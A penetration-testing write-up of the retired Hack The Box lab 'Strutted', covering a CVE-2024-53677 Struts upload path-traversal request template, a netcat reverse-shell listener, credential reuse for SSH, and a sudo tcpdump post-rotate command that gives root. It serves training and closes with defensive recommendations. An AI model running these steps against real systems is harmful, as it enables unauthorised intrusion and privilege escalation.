---
title: "Strutted — Legacy Struts Upload and tcpdump Sudo Hook"
description: "An exposed application archive identifies legacy Apache Struts upload handling, and CVE-2024-53677 path traversal yields a service-account shell; a stored credential enables SSH, and a sudo tcpdump post-rotate hook reaches root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - apache-struts
  - cve-2024-53677
  - path-traversal
  - file-upload
  - sudo-abuse
  - tcpdump
---

## Summary

Strutted is a Medium Hack The Box Linux lab. The notes report a chain from a downloadable application archive to legacy Apache Struts upload handling, a service-account foothold, an SSH login using a separately redacted credential, and privileged command execution through a `tcpdump` sudo rule. Target identifiers, accounts, credentials, flags, and attacker infrastructure are replaced with role-based placeholders. Commands are representative evidence, not instructions.

## Context and Objective

The recorded environment exposed SSH and HTTP, with HTTP routed through a virtual host. The application archive identified Apache Struts 6.3.0.1 and an upload action using the legacy `FileUploadInterceptor`. The objective was to assess the documented chain from application access to privileged execution within the isolated Hack The Box lab.

## Approach and Evidence

### 1. Service Enumeration

**Observation:** The recorded scan identified SSH and HTTP; HTTP redirected to a virtual host.

**Action:** Scan TCP services with version detection, then configure local name resolution for the lab virtual host.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Representative output (truncated):

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://<LAB_VHOST>/
```

**Technical significance:** The redirect established that subsequent web enumeration needed the virtual-host context.

**Result:** The recorded output shows SSH and HTTP exposed by an Ubuntu host.

### 2. Source Disclosure and Upload-Flow Review

**Observation:** Content discovery returned a downloadable archive. The notes report that its build metadata identified Struts 6.3.0.1 and its configuration used `FileUploadInterceptor` with image-extension checks.

**Action:** Enumerate web content, retrieve the exposed archive, and review the framework and upload configuration.

```bash
feroxbuster --url http://<LAB_VHOST> --wordlist <CONTENT_WORDLIST>
```

Representative output:

```text
200 GET http://<LAB_VHOST>/download
```

```xml
<interceptor-ref name="fileUpload">
    <param name="allowedExtensions">jpg,jpeg,png,gif</param>
</interceptor-ref>
```

**Technical significance:** Framework version and legacy upload handling narrowed review to CVE-2024-53677 and showed that extension and image-header checks were present.

**Result:** The notes report that the archive exposed the conditions used to assess the Struts upload path.

### 3. CVE-2024-53677 Upload Path Traversal

**Observation:** The notes report that a manipulated upload filename parameter could traverse from the upload location to a web-served path. The upload handler also checked image magic bytes.

**Action:** Submit an image-header-prefixed, non-public server-side payload through the upload action while replacing the filename parameter with a traversal path. The executable payload is intentionally omitted.

```http
POST /upload.action HTTP/1.1
Host: <LAB_VHOST>
Content-Type: multipart/form-data; boundary=<BOUNDARY>

--<BOUNDARY>
Content-Disposition: form-data; name="Upload"; filename="<IMAGE_NAME>.jpg"
Content-Type: image/jpeg

<IMAGE_HEADER><SANITIZED_NON_EXECUTABLE_CONTENT>
--<BOUNDARY>
Content-Disposition: form-data; name="top.UploadFileName"

../../<SERVER_SIDE_FILE>.jsp
--<BOUNDARY>--
```

Representative output:

```text
uid=<SERVICE_UID>(<SERVICE_ACCOUNT>) gid=<SERVICE_GID>(<SERVICE_ACCOUNT>)
```

**Technical significance:** The traversal changed the server-side destination while the image header addressed the application's content check. A server-side file placed in a processed web path can execute in the application service context.

**Result:** The recorded output shows command execution as the application service account.

### 4. Service-Account Foothold

**Observation:** Command execution ran in the application service context.

**Action:** Verify the execution context and establish an interactive callback using redacted listener details.

```bash
nc -lvnp <LISTENER_PORT>
```

Representative output:

```text
<SERVICE_ACCOUNT>@<TARGET_HOST>:~$ id
uid=<SERVICE_UID>(<SERVICE_ACCOUNT>) gid=<SERVICE_GID>(<SERVICE_ACCOUNT>)
```

**Technical significance:** Confirming the service account distinguished application execution from an interactive user session and established the starting privilege level for local review.

**Result:** The notes report an interactive shell as the application service account.

### 5. Stored Credential and SSH Access

**Observation:** The notes report a cleartext credential in application-server configuration.

**Action:** Search the service configuration for password fields, then test the recovered credential against SSH for a distinct lab user.

```bash
grep -R "password" <APPLICATION_CONFIG_DIRECTORY> 2>/dev/null
```

Representative finding:

```xml
<user username="<APPLICATION_ACCOUNT>" password="<APPLICATION_PASSWORD>" roles="<APPLICATION_ROLES>"/>
```

```bash
ssh <SSH_ACCOUNT>@<LAB_VHOST>
```

**Technical significance:** A credential accessible to the service account becomes a lateral-movement risk when it is accepted by another service. The notes establish acceptance by SSH; they do not establish broader credential reuse.

**Result:** The notes report successful SSH access as `<SSH_ACCOUNT>` using `<APPLICATION_PASSWORD>`.

### 6. Privilege Escalation Through tcpdump

**Observation:** The SSH user could run `tcpdump` through sudo without a password.

**Action:** Inspect allowed sudo commands, then invoke `tcpdump` with its post-rotate hook directed to a redacted executable path.

```bash
sudo -l
```

Representative output:

```text
User <SSH_ACCOUNT> may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

```bash
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z <POST_ROTATE_SCRIPT> -Z root
```

Representative output:

```text
root
```

**Technical significance:** `-G 1` triggers rotation, `-z` selects a post-rotate command, and `-Z root` retains root for that hook. An unrestricted sudo rule for this option combination permits privileged command execution.

**Result:** The recorded output shows that the post-rotate hook produced a root shell.

## Challenges and Decisions

| Challenge | Decision | Supported rationale |
|---|---|---|
| Image validation on upload | Use an image header before the sanitized server-side content | The notes report magic-byte validation. |
| Identifying the upload weakness | Review the exposed archive before assessing the upload action | The archive identified the framework version and legacy interceptor. |
| Privilege boundary | Inspect sudo permissions before selecting an escalation path | The recorded `sudo -l` output allowed `tcpdump`. |

## Outcome

The notes report full compromise of the Strutted lab through a documented three-part chain: CVE-2024-53677 upload path traversal produced an application-service foothold; a stored application credential enabled SSH access for a distinct user; and the `tcpdump` post-rotate hook executed with root privileges. The recorded command outputs support the service-account and root contexts. The notes do not provide independent evidence beyond the lab record.

## Lessons and Recommendations

1. **Recommendation:** Remove publicly accessible source archives from production deployments; they can disclose dependency versions and security-relevant configuration.
2. **Recommendation:** Upgrade or replace legacy Struts upload handling affected by CVE-2024-53677, and ensure server-side upload destinations cannot be controlled through request parameters.
3. **Recommendation:** Keep application credentials out of files readable by service accounts, and prevent application credentials from being accepted by SSH accounts.
4. **Recommendation:** Restrict sudo rules by executable arguments. Do not allow `tcpdump` options that invoke post-rotate commands unless that behavior is explicitly required and safely constrained.

## References

- Hack The Box, [Strutted](https://app.hackthebox.com/machines/Strutted) machine (retired lab)
- CVE-2024-53677, Apache Struts file-upload path-traversal vulnerability
- Apache Struts security advisories
- `tcpdump` manual page, `-z` post-rotate command and `-Z` privilege-drop options
